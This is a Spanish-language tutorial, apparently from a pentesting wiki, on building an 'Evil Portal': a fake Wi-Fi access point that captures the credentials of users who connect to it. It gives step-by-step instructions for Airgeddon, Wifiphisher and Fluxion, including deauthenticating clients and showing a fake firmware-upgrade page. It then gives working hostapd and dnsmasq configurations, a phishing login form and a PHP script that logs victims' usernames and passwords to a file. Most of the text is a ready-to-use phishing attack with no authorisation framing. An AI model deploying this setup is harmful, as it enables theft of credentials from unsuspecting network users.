
# Evil Portal

## <mark style="color:purple;">¿Qué es un Evil Portal?</mark>

Un **Evil Portal** es una técnica utilizada en ataques de red donde se crea un punto de acceso falso que imita una red legítima. Los atacantes configuran este portal malicioso para engañar a los usuarios y hacer que se conecten a él, permitiéndoles capturar credenciales sensibles, información privada y otros datos personales. Este método es comúnmente implementado utilizando herramientas de auditoría de seguridad como las incluidas en Kali Linux, y es especialmente efectivo en entornos donde los usuarios no verifican la autenticidad de las redes a las que se conectan.

Si tienes un **adaptador de red en modo monitor**, puedes usar herramientas incluidas en **Kali Linux** como **Airgeddon, Wifiphisher, Fluxion o Rogue-AP (manual con Hostapd y Dnsmasq)** para crear un **Evil Portal**

***

## <mark style="color:purple;">**Airgeddon**</mark>

**Airgeddon** es una de las mejores opciones, ya que automatiza ataques MITM y Evil Portals.

{% embed url="<https://github.com/v1s1t0r1sh3r3/airgeddon>" %}

#### **Instalar Airgeddon**

```bash
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh
```

#### **Iniciar el Ataque**

1. Ejecuta Airgeddon y selecciona tu **adaptador en modo monitor**.
2. Ve a la opción **Rogue AP Attack** > **Evil Twin Attack**.
3. Elige una red WiFi objetivo y clona su SSID.
4. Activa el **Evil Portal** y elige una plantilla (puedes personalizarla).
5. Inicia el ataque y espera a que las víctimas ingresen credenciales.

✅ **Ventaja:** Automatización total, soporte para Evil Portals personalizables.

***

## <mark style="color:purple;">**Wifiphisher**</mark>

**Wifiphisher** crea un **Access Point falso** y redirige a los usuarios a una **página de phishing** automáticamente.

{% embed url="<https://github.com/wifiphisher/wifiphisher>" %}

#### **Instalar Wifiphisher**

```bash
sudo apt update && sudo apt install wifiphisher -y
```

#### **Iniciar el Ataque**

```bash
sudo wifiphisher --essid "WiFi Gratis" --phishing-page firmware-upgrade
```

📌 Esto creará un punto de acceso falso y mostrará una **página falsa de actualización de firmware** para capturar credenciales.

✅ **Ventaja:** Muy rápido y fácil de usar.

***

## <mark style="color:purple;">**Fluxion**</mark>

**Fluxion** usa un ataque **Evil Twin** para desautenticar a los clientes y redirigirlos a un portal cautivo falso.

{% embed url="<https://github.com/FluxionNetwork/fluxion>" %}

#### **Instalar Fluxion**

```bash
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo bash fluxion.sh
```

#### **Guia del Captive Portal**

{% embed url="<https://github.com/FluxionNetwork/fluxion/wiki/Captive-Portal-Attack>" %}

#### **Iniciar el Ataque**

1. Selecciona **"Evil Twin Attack"**.
2. Clona el SSID de la red objetivo.
3. Activa el **deautenticador** para forzar a los usuarios a reconectarse.
4. Usa **Captive Portal** con una página falsa de autenticación.
5. Captura credenciales en tiempo real.

✅ **Ventaja:** Redirección con portales cautivos, fácil de configurar.

***

## <mark style="color:purple;">**Rogue AP Manual con Hostapd + Dnsmasq + Apache**</mark>

Si quieres hacerlo manualmente, puedes configurar un **Rogue Access Point** con **Hostapd**, **Dnsmasq** y **Apache**.

#### **1️⃣ Instalar Dependencias**

```bash
sudo apt install hostapd dnsmasq apache2 php -y
```

#### **2️⃣ Configurar Hostapd**

* Edita el archivo `/etc/hostapd/hostapd.conf`:

```ini
interface=wlan0
driver=nl80211
ssid=WiFi Gratis
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=password123
```

* Inicia el AP:

```bash
sudo hostapd /etc/hostapd/hostapd.conf
```

#### **Configurar DHCP y Redirección con Dnsmasq**

* Edita `/etc/dnsmasq.conf`:

```ini
interface=wlan0
dhcp-range=192.168.1.2,192.168.1.100,12h
address=/#/192.168.1.1
```

* Inicia Dnsmasq:

```bash
sudo systemctl restart dnsmasq
```

#### **Configurar el Evil Portal en Apache**

* Edita `/var/www/html/index.html`:

```html
<form action="login.php" method="post">
    <input type="text" name="username" placeholder="Usuario">
    <input type="password" name="password" placeholder="Contraseña">
    <input type="submit" value="Iniciar sesión">
</form>
```

* Edita `/var/www/html/login.php`:

```php
<?php
$file = fopen("creds.txt", "a");
fwrite($file, "Usuario: ".$_POST['username']." | Contraseña: ".$_POST['password']."\n");
fclose($file);
header('Location: https://google.com');
exit();
?>
```

Otorga permisos:

```bash
sudo chmod 777 /var/www/html/creds.txt
```

#### **Iniciar el Evil Portal**

```bash
sudo systemctl restart apache2
```

📌 Ahora cualquier usuario que se conecte verá la página falsa y sus credenciales se guardarán en `creds.txt`.

✅ **Ventaja:** Control total sobre la configuración y personalización.
